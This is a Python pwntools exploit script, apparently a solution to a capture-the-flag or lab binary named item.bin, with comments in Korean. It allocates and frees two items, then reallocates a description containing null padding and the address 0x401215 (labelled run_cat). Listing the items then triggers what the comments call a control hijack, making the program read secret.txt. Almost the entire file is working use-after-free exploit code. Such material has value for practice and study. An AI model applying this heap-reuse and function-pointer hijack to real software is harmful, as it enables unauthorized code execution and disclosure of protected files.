#!/usr/bin/python3

from pwn import *


def exploit():
    # Write your exploit logic here.
    p = process("./item.bin")
    
    # items[0] 할당받기.
    for i in range(5):
        print(p.recvline())
    print(p.recvuntil(b"choice: "))
    p.sendline(b"A")
    print(p.recvuntil(b"new item: "))
    p.sendline(b"./secret.txt")
    print(p.recvuntil(b"item description: "))
    p.sendline(b"10")
    print(p.recvuntil(b"item description: "))
    p.sendline(b"Hello")

    # items[1] 할당받기.
    for i in range(5):
        print(p.recvline())
    print(p.recvuntil(b"choice: "))
    p.sendline(b"A")
    print(p.recvuntil(b"new item: "))
    p.sendline(b"./secret.txt2")
    print(p.recvuntil(b"item description: "))
    p.sendline(b"10")
    print(p.recvuntil(b"item description: "))
    p.sendline(b"Hello")

    # 그 다음, items[0] 삭제하기.
    for i in range(5):
        print(p.recvline())
    print(p.recvuntil(b"choice: "))
    p.sendline(b"D")
    print(p.recvuntil(b"to delete: "))
    p.sendline(b"./secret.txt")

    # 그 다음, items[1] 삭제하기.
    for i in range(5):
        print(p.recvline())
    print(p.recvuntil(b"choice: "))
    p.sendline(b"D")
    print(p.recvuntil(b"to delete: "))
    p.sendline(b"./secret.txt2")

    # 그 다음, items[2]를 새롭게 만들기.
    for i in range(5):
        print(p.recvline())
    print(p.recvuntil(b"choice: "))
    p.sendline(b"A")
    print(p.recvuntil(b"new item: "))
    p.sendline(b"./secret.txt")
    print(p.recvuntil(b"item description: "))
    p.sendline(b"64")
    print(p.recvuntil(b"item description: "))
    # 0x401215는 run_cat의 주소가 됨.
    p.sendline(b"./secret.txt" + b"\x00" * 28 + p64(0x401215))
    
    # 이제 Control Hijack 일으키기.
    for i in range(5):
        print(p.recvline())
    print(p.recvuntil(b"choice: "))
    p.sendline(b"L")

    print(p.recvline())


if __name__ == "__main__":
    exploit()
